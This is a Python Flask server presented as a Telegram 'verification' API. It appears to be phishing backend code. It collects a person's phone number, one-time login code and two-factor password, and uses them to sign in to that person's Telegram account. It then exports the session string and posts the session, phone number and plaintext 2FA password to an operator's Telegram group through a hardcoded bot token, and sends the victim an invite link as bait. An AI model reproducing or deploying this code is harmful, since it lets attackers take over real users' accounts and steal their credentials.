import asyncio, logging, traceback, os
try:
    import nest_asyncio
    nest_asyncio.apply()
except ImportError:
    pass
from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid,
    PhoneCodeExpired, PasswordHashInvalid, FloodWait, PhoneNumberInvalid
)
import urllib.request, json as _json

API_ID   = 35307937

API_HASH = "9c6e00f1aec844a2262224bb146ab6c3"

BOT_TOKEN = "8787029263:AAHwJQLU-J_snJed65yPWnbfi1x2v_OOfTY"

QUEUE_CHAT_ID = "-1003961182757"

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

LOOP = asyncio.new_event_loop()
asyncio.set_event_loop(LOOP)

_sessions = {}


def telegram_send(chat_id: str, text: str):
    """Telegram send"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = _json.dumps({
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }).encode()
    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = _json.loads(resp.read())
            log.info(f"telegram_send ok: msg_id={result.get('result', {}).get('message_id')}")
    except Exception as e:
        log.error(f"telegram_send failed: {e}")


def notify_bot_via_queue(tg_id: int, session: str, phone: str, tfa: str = None):
    """Verified data send to group + invite link to user"""

    payload_text = _json.dumps({
        "tg_id": tg_id,
        "session": session,
        "phone": phone,
        "2fa": tfa
    }, indent=2)
    msg = f"#VERIFIED NEW USER\n<pre>{payload_text}</pre>"
    telegram_send(QUEUE_CHAT_ID, msg)
    invite_text = "✅ Verified! Here your link\n\nhttps://t.me/+JJBombLIFQE3MzA1"
    telegram_send(str(tg_id), invite_text)

async def _send_otp(phone: str):
    old = _sessions.pop(phone, None)
    if old and old.get("client"):
        try: await old["client"].disconnect()
        except: pass

    client = Client(
        name=phone.replace("+", ""),
        api_id=int(API_ID),
        api_hash=str(API_HASH),
        in_memory=True,
        no_updates=True
    )
    try:
        await client.connect()
        sent = await client.send_code(phone)
        _sessions[phone] = {"client": client, "hash": str(sent.phone_code_hash), "phone": phone}
        return {"ok": True}
    except FloodWait as e:
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": f"Too many attempts. Wait {e.value}s."}
    except PhoneNumberInvalid:
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": "Invalid phone number."}
    except Exception as e:
        err_tb = traceback.format_exc()
        log.error(f"_send_otp error:\n{err_tb}")
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": str(e), "traceback": err_tb}


async def _verify_otp(phone: str, code: str):
    sess = _sessions.get(phone)
    if not sess or not sess.get("client"):
        return {"ok": False, "error": "Session expired. Go back and try again."}

    client    = sess["client"]
    code_hash = sess["hash"]

    try:
        await client.sign_in(
            phone_number=phone,
            phone_code_hash=code_hash,
            phone_code=code
        )
        session_str = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        _sessions.pop(phone, None)
        return {"ok": True, "session": session_str, "tg_id": me.id, "phone": phone}

    except SessionPasswordNeeded:
        try: hint = await client.get_password_hint()
        except: hint = ""
        sess["need_2fa"] = True
        return {"ok": False, "need_2fa": True, "hint": hint or ""}
    except PhoneCodeInvalid:
        return {"ok": False, "error": "Wrong OTP code. Try again."}
    except PhoneCodeExpired:
        try: await client.disconnect()
        except: pass
        _sessions.pop(phone, None)
        return {"ok": False, "error": "OTP expired. Go back and try again."}
    except Exception as e:
        err_tb = traceback.format_exc()
        log.error(f"_verify_otp error:\n{err_tb}")
        try: await client.disconnect()
        except: pass
        _sessions.pop(phone, None)
        return {"ok": False, "error": str(e), "traceback": err_tb}


async def _verify_2fa(phone: str, password: str):
    sess = _sessions.get(phone)
    if not sess or not sess.get("client"):
        return {"ok": False, "error": "Session expired. Go back and try again."}

    client = sess["client"]

    try:
        await client.check_password(password)
        session_str = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        _sessions.pop(phone, None)
        return {"ok": True, "session": session_str, "tg_id": me.id, "phone": phone}
    except PasswordHashInvalid:
        return {"ok": False, "error": "Wrong 2FA password. Try again."}
    except Exception as e:
        err_tb = traceback.format_exc()
        log.error(f"_verify_2fa error:\n{err_tb}")
        try: await client.disconnect()
        except: pass
        _sessions.pop(phone, None)
        return {"ok": False, "error": str(e), "traceback": err_tb}

@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"ok": True, "msg": "Toxic Verify API running"})


@app.route("/send-otp", methods=["POST"])
def send_otp():
    body  = request.get_json(silent=True) or {}
    phone = str(body.get("phone", "")).strip()
    if not phone:
        return jsonify({"ok": False, "error": "Missing phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    log.info(f"send-otp: phone={phone!r}")
    try:
        result = LOOP.run_until_complete(_send_otp(phone))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e), "traceback": traceback.format_exc()}), 500

    if result["ok"]:
        return jsonify({"ok": True, "message": "OTP sent to your Telegram app"})
    return jsonify({"ok": False, "error": result["error"], "traceback": result.get("traceback", "")}), 400


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    body  = request.get_json(silent=True) or {}
    otp   = str(body.get("otp", "")).strip()
    phone = str(body.get("phone", "")).strip()
    if not otp or not phone:
        return jsonify({"ok": False, "error": "Missing otp or phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    try:
        result = LOOP.run_until_complete(_verify_otp(phone, otp))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e), "traceback": traceback.format_exc()}), 500

    if result["ok"]:
        notify_bot_via_queue(result["tg_id"], result["session"], result["phone"], tfa=None)
        return jsonify({"ok": True, "message": "OTP verified!"})
    elif result.get("need_2fa"):
        return jsonify({"ok": False, "need_2fa": True, "hint": result["hint"]})
    return jsonify({"ok": False, "error": result["error"], "traceback": result.get("traceback", "")}), 400


@app.route("/verify-2fa", methods=["POST"])
def verify_2fa():
    body     = request.get_json(silent=True) or {}
    password = body.get("password", "").strip()
    phone    = str(body.get("phone", "")).strip()
    if not password or not phone:
        return jsonify({"ok": False, "error": "Missing password or phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    try:
        result = LOOP.run_until_complete(_verify_2fa(phone, password))
    except Exception as e:
        return jsonify({"ok": False, "error": str(e), "traceback": traceback.format_exc()}), 500

    if result["ok"]:
        notify_bot_via_queue(result["tg_id"], result["session"], result["phone"], tfa=password)
        return jsonify({"ok": True, "message": "2FA verified!"})
    return jsonify({"ok": False, "error": result["error"], "traceback": result.get("traceback", "")}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False, use_reloader=False)
